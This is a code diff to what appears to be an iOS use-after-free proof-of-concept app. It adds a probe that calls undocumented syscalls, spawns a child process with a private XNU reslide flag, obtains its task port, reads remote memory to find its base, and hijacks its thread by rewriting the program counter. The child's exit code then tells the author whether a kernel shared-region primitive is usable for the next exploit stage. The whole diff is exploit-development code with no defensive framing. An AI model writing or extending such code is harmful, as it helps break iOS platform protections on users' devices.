@@ -30,6 +30,37 @@
 #include <dirent.h>
 #include <sys/stat.h>
 #include <signal.h>
+#include <spawn.h>
+#include <sys/wait.h>
+#include <mach/mach_vm.h>
+#include <mach-o/loader.h>
+
+// _POSIX_SPAWN_RESLIDE (0x0800) — private XNU flag, may not be in iOS SDK
+#if !defined(_POSIX_SPAWN_RESLIDE)
+#define _POSIX_SPAWN_RESLIDE 0x0800
+#endif
+
+// arm_thread_state64_t — try SDK header, else define manually
+#if __has_include(<mach/arm/thread_state.h>)
+#include <mach/arm/thread_state.h>
+#else
+#define ARM_THREAD_STATE64 6
+#define ARM_THREAD_STATE64_COUNT ((mach_msg_type_number_t)(sizeof(arm_thread_state64_t)/sizeof(unsigned int)))
+typedef struct {
+    uint64_t x[29];
+    uint64_t fp;
+    uint64_t lr;
+    uint64_t sp;
+    uint64_t pc;
+    uint32_t cpsr;
+    uint32_t flags;
+} arm_thread_state64_t;
+#endif
+
+// RIE_PROBE_OFFSET — replaced at build time by CI (nm child | grep child_probe)
+#ifndef RIE_PROBE_OFFSET
+#define RIE_PROBE_OFFSET RIE_PROBE_OFFSET_PLACEHOLDER
+#endif
 
 #if __has_include("UAFPoc-Swift.h")
 #import "UAFPoc-Swift.h"
@@ -9040,19 +9071,210 @@ static void sigsys_handler(int sig) { atomic_store(&g_sigsys_fired, true); }
     });
 }
 
+// ---- Rie child spawn + hijack helpers (v206) ----
+
+// Find MH_EXECUTE load base in target task via mach_vm_region_recurse
+static uint64_t rie_find_exec_base(task_t task) {
+    mach_vm_address_t addr = 0;
+    mach_vm_size_t size = 0;
+    natural_t depth = 0;
+    for (int i = 0; i < 500; i++) {
+        vm_region_submap_info_data_64_t info;
+        mach_msg_type_number_t cnt = VM_REGION_SUBMAP_INFO_COUNT_64;
+        kern_return_t kr = mach_vm_region_recurse(task, &addr, &size, &depth,
+            (vm_region_recurse_info_t)&info, &cnt);
+        if (kr != KERN_SUCCESS) break;
+        uint32_t hdr[4] = {0};
+        mach_vm_size_t got = 0;
+        if (mach_vm_read_overwrite(task, addr, sizeof(hdr),
+                (mach_vm_address_t)hdr, &got) == KERN_SUCCESS &&
+            got == sizeof(hdr) &&
+            hdr[0] == MH_MAGIC_64 &&
+            hdr[3] == MH_EXECUTE) {
+            return (uint64_t)addr;
+        }
+        addr += size;
+        if (addr > 0x200000000ULL) break; // sanity: 8GB
+    }
+    return 0;
+}
+
 - (void)rieProbeTapped {
     dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
-        [self appendLog:@"\n=== Rie shared_region syscall probe ===\n"];
+        [self appendLog:@"\n=== Rie v206: syscall + child reslide probe ===\n"];
 
+        // ── Phase A: direct syscall probe (v205 proven) ──
+        [self appendLog:@"── Phase A: direct syscall probe ──"];
         long (*sc)(int, ...) = dlsym(RTLD_DEFAULT, "syscall");
         [self appendLog:[NSString stringWithFormat:@"dlsym(syscall)=%p", sc]];
 
         if (sc) {
-            // syscall 294 = shared_region_check_np(uint64_t *start)
-            // Pass a valid pointer — not NULL!
             uint64_t addr = 0;
             long r = sc(294, &addr);
-            [self appendLog:[NSString stringWithFormat:@"syscall(294,&addr): ret=%ld errno=%d addr=0x%llx", r, errno, addr]];
+            [self appendLog:[NSString stringWithFormat:@"syscall(294,&addr): ret=%ld addr=0x%llx", r, addr]];
+
+            long r536 = sc(536, 0, 0, 0, 0);
+            [self appendLog:[NSString stringWithFormat:@"syscall(536,0,0,0,0): ret=%ld errno=%d", r536, errno]];
+            if (r536 == -1 && errno == 22) {
+                [self appendLog:@"→ EINVAL — syscall 536 EXISTS on iOS!"];
+            }
+        }
+
+        // ── Phase B: child spawn + thread hijack probe ──
+        [self appendLog:@"\n── Phase B: child RESLIDE spawn + hijack ──"];
+
+        // Find child binary in app bundle
+        NSString *childPath = [[[NSBundle mainBundle] bundlePath]
+            stringByAppendingPathComponent:@"rie_child"];
+        [self appendLog:[NSString stringWithFormat:@"child path: %@", childPath]];
+
+        if (![[NSFileManager defaultManager] fileExistsAtPath:childPath]) {
+            [self appendLog:@"!! child binary NOT FOUND in bundle — skip Phase B"];
+            [self appendLog:@"=== Rie probe done ==="];
+            return;
+        }
+
+        // Resolve task_for_pid via dlsym (may not be in public iOS SDK)
+        kern_return_t (*tfp)(task_t, int, task_t *) = dlsym(RTLD_DEFAULT, "task_for_pid");
+        [self appendLog:[NSString stringWithFormat:@"task_for_pid=%p", tfp]];
+
+        posix_spawnattr_t attr;
+        posix_spawnattr_init(&attr);
+        short flags = POSIX_SPAWN_START_SUSPENDED | (short)_POSIX_SPAWN_RESLIDE;
+        int setf_rc = posix_spawnattr_setflags(&attr, flags);
+        [self appendLog:[NSString stringWithFormat:@"spawnattr_setflags(0x%04x)=%d", flags, setf_rc]];
+
+        char *cpath = (char *)[childPath UTF8String];
+        char *cargs[] = { cpath, NULL };
+        pid_t pid = -1;
+        int sp_rc = posix_spawn(&pid, cpath, NULL, &attr, cargs, NULL);
+        posix_spawnattr_destroy(&attr);
+
+        if (sp_rc != 0) {
+            [self appendLog:[NSString stringWithFormat:@"!! posix_spawn failed: %s (%d)", strerror(sp_rc), sp_rc]];
+            if (sp_rc == 78) {
+                [self appendLog:@"  → ENOEXEC (78): code-signing issue? ad-hoc sig may not work on iOS"];
+            } else if (sp_rc == 1) {
+                [self appendLog:@"  → EPERM (1): RESLIDE or START_SUSPENDED not allowed on iOS?"];
+            } else if (sp_rc == 22) {
+                [self appendLog:@"  → EINVAL (22): _POSIX_SPAWN_RESLIDE not recognized on iOS?"];
+            }
+            [self appendLog:@"=== Rie probe done ==="];
+            return;
+        }
+        [self appendLog:[NSString stringWithFormat:@"child spawned: pid=%d (suspended,reslide)", pid]];
+
+        if (!tfp) {
+            [self appendLog:@"!! task_for_pid unavailable — cannot hijack child"];
+            kill(pid, SIGKILL); waitpid(pid, NULL, 0);
+            [self appendLog:@"=== Rie probe done ==="];
+            return;
+        }
+
+        task_t ctask = TASK_NULL;
+        kern_return_t kr = tfp(mach_task_self(), pid, &ctask);
+        if (kr != KERN_SUCCESS) {
+            [self appendLog:[NSString stringWithFormat:@"!! task_for_pid failed: %s (0x%x)",
+                mach_error_string(kr), kr]];
+            if (kr == 5) {
+                [self appendLog:@"  → KERN_FAILURE (5): needs get-task-allow on child OR task_for_pid-allow entitlement"];
+            }
+            kill(pid, SIGKILL); waitpid(pid, NULL, 0);
+            [self appendLog:@"=== Rie probe done ==="];
+            return;
+        }
+        [self appendLog:[NSString stringWithFormat:@"task_for_pid OK: ctask=%u", ctask]];
+
+        // Get child's main thread
+        thread_act_array_t threads = NULL;
+        mach_msg_type_number_t nthreads = 0;
+        kr = task_threads(ctask, &threads, &nthreads);
+        if (kr != KERN_SUCCESS || nthreads < 1) {
+            [self appendLog:[NSString stringWithFormat:@"!! task_threads failed: %s (0x%x) n=%u",
+                mach_error_string(kr), kr, nthreads]];
+            kill(pid, SIGKILL); waitpid(pid, NULL, 0);
+            [self appendLog:@"=== Rie probe done ==="];
+            return;
+        }
+        thread_t th = threads[0];
+        [self appendLog:[NSString stringWithFormat:@"main thread: %u", th]];
+
+        // Find child's exec base
+        uint64_t base = rie_find_exec_base(ctask);
+        if (base == 0) {
+            [self appendLog:@"!! could not locate child exec base in remote task"];
+            kill(pid, SIGKILL); waitpid(pid, NULL, 0);
+            [self appendLog:@"=== Rie probe done ==="];
+            return;
+        }
+        uint64_t probeAddr = base + RIE_PROBE_OFFSET;
+        [self appendLog:[NSString stringWithFormat:@"exec base=0x%llx probe=0x%llx",
+            (unsigned long long)base, (unsigned long long)probeAddr]];
+
+        // Hijack thread: set PC = child_probe
+        arm_thread_state64_t st;
+        mach_msg_type_number_t scount = ARM_THREAD_STATE64_COUNT;
+        kr = thread_get_state(th, ARM_THREAD_STATE64, (thread_state_t)&st, &scount);
+        if (kr != KERN_SUCCESS) {
+            [self appendLog:[NSString stringWithFormat:@"!! thread_get_state failed: %s (0x%x)",
+                mach_error_string(kr), kr]];
+            kill(pid, SIGKILL); waitpid(pid, NULL, 0);
+            [self appendLog:@"=== Rie probe done ==="];
+            return;
+        }
+        [self appendLog:[NSString stringWithFormat:@"orig PC=0x%llx SP=0x%llx",
+            (unsigned long long)st.pc, (unsigned long long)st.sp]];
+
+        st.pc = (uint64_t)probeAddr;
+        st.sp &= ~0xFULL;  // align to 16 bytes
+
+        kr = thread_set_state(th, ARM_THREAD_STATE64, (thread_state_t)&st, scount);
+        if (kr != KERN_SUCCESS) {
+            [self appendLog:[NSString stringWithFormat:@"!! thread_set_state failed: %s (0x%x)",
+                mach_error_string(kr), kr]];
+            kill(pid, SIGKILL); waitpid(pid, NULL, 0);
+            [self appendLog:@"=== Rie probe done ==="];
+            return;
+        }
+        [self appendLog:[NSString stringWithFormat:@"PC set to child_probe (0x%llx)", (unsigned long long)probeAddr]];
+
+        // Release thread list
+        vm_deallocate(mach_task_self(), (vm_address_t)threads,
+            nthreads * sizeof(thread_act_t));
+
+        // Resume child — it will execute child_probe and exit
+        kr = task_resume(ctask);
+        if (kr != KERN_SUCCESS) {
+            [self appendLog:[NSString stringWithFormat:@"!! task_resume failed: %s (0x%x)",
+                mach_error_string(kr), kr]];
+            kill(pid, SIGKILL); waitpid(pid, NULL, 0);
+            [self appendLog:@"=== Rie probe done ==="];
+            return;
+        }
+
+        int status = 0;
+        if (waitpid(pid, &status, 0) < 0) {
+            [self appendLog:[NSString stringWithFormat:@"!! waitpid failed: %s", strerror(errno)]];
+            [self appendLog:@"=== Rie probe done ==="];
+            return;
+        }
+
+        if (WIFEXITED(status)) {
+            int code = WEXITSTATUS(status);
+            const char *meaning =
+                code == 12 ? "ENOMEM: BOUND-but-EMPTY => VIABLE #536 FIRST-MAPPER! ***" :
+                code == 0  ? "region already populated" :
+                code == 22 ? "EINVAL: no region bound" :
+                code == 0x53 ? "child_trigger STUB (wrong hijack target?)" :
+                               "unexpected";
+            [self appendLog:[NSString stringWithFormat:@"child exit=%d (%s)", code, meaning]];
+            if (code == 12) {
+                [self appendLog:@"\n*** RIE RESLIDE REGION VIABLE — can proceed to syscall 536! ***"];
+            }
+        } else if (WIFSIGNALED(status)) {
+            int sig = WTERMSIG(status);
+            [self appendLog:[NSString stringWithFormat:@"!! child killed by signal %d (%s) — hijack/PAC issue",
+                sig, sig == 4 ? "SIGILL" : sig == 11 ? "SIGSEGV" : sig == 6 ? "SIGABRT" : "?"]];
         }
 
         [self appendLog:@"=== Rie probe done ==="];
